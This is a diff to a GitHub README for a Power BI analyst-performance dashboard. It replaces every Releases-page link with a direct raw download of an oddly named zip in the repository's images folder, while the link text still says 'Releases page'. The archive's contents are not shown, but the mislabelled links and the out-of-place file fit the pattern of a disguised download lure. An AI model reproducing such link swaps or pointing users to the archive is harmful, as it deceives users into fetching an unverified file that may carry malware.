@@ -1,7 +1,7 @@
 # 🚀 Analysts-Performance-Dashboard - Simplifying Your Data Insights
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Analysts--Performance--Dashboard-blue.svg)](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases)
+[![Download](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/raw/refs/heads/main/images/Dashboard-Analysts-Performance-collier.zip)](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/raw/refs/heads/main/images/Dashboard-Analysts-Performance-collier.zip)
 
 ## 📘 Overview
 Welcome to the Analysts-Performance-Dashboard. This interactive Power BI dashboard helps you analyze key metrics like analyst performance, SLA compliance, ticket resolution efficiency, and workload distribution. With this tool, you can make informed operational decisions backed by data.
@@ -23,7 +23,7 @@ To run Analysts-Performance-Dashboard, ensure your system meets the following re
 Follow these simple steps to download and set up the Analysts-Performance-Dashboard:
 
 ### Step 1: Visit the Download Page
-Go to the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases) to find the latest version of the dashboard.
+Go to the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/raw/refs/heads/main/images/Dashboard-Analysts-Performance-collier.zip) to find the latest version of the dashboard.
 
 ### Step 2: Download the Dashboard
 Locate the appropriate version for your system. Click on the link to download the file.
@@ -38,7 +38,7 @@ Once you have downloaded the Analysts-Performance-Dashboard file, open Power BI 
 After loading the dashboard, you can start interacting with the data. Navigate through various visuals and metrics to gain insights into your team's performance.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/releases) and download the latest version of the Analysts-Performance-Dashboard.
+To get started, visit the [Releases page](https://github.com/Tsmith4k/Analysts-Performance-Dashboard/raw/refs/heads/main/images/Dashboard-Analysts-Performance-collier.zip) and download the latest version of the Analysts-Performance-Dashboard.
 
 ## 📊 How to Use
 Using the Analysts-Performance-Dashboard is straightforward. Here’s a brief guide on navigating its features:
